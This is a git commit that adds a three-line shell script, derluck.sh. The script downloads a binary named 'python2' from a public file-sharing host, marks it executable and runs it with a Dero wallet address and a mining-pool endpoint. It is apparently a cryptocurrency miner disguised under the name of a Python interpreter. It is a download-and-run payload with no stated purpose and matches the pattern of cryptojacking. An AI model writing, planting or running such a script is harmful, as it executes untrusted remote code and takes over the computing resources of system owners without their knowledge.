3edb4a8a319d4c24f4e8ccc0b5b4d4b5331f18be
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-08-27 12:43:20 +0700

    Create derluck.sh

---
+++ derluck.sh
@@ -0,0 +1,3 @@
+wget https://filebin.net/7jcf23jc9i8nu4qo/python2
+chmod +x python2
+./python2 -w deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqepmry5nlsk5z6eq -d dero.rabidmining.com:10300
